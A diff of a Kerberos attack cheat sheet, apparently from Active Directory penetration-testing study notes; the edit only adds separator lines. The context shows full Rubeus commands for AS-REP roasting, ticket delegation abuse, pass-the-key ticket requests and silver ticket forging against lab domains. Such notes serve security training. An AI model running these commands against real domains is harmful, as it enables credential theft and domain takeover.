@@ -474,6 +474,7 @@ Brute Password spray:
 ```Rubeus.exe asreproast /nowrap```
 - [Full aseproast](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#get-as-reps)
 
+* * *
 
 #### List tickets
 Get tickets currently on System:
@@ -487,6 +488,7 @@ Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
 Hash of a user:
 ```rubeus.exe hash /user:Josh /domain:ecorp.local /password:Password@1```
 
+* * *
 
 #### Pass-the-key/Over-PTH
 Request ticket (TGT) based on username and password/hash:
@@ -499,6 +501,8 @@ Request Service ticket (TGS) based on Service Name:
 ```
 Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
 ```
+
+* * *
 
 #### Golden:
 
@@ -526,6 +530,8 @@ optional:
 ```
 rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
 ```
+
+* * *
 
 #### Maintenance
 Purge all kerberos tickets: ```rubeus.exe purge```
